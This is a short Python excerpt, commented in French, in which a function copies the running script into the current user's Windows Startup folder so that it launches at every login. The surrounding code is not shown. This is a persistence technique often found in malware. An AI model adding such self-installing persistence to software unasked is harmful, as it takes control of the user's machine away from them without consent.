...
def startup_copy_file():
    ...
    #chemin vers le dossier de démarrage
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

    
    statup_path = os.path.join(startup_folder, os.path.basename(file_path))

    #copier script dans le dossier startup
    if not os.path.exists(statup_path):
        shutil.copy(file_path, statup_path)
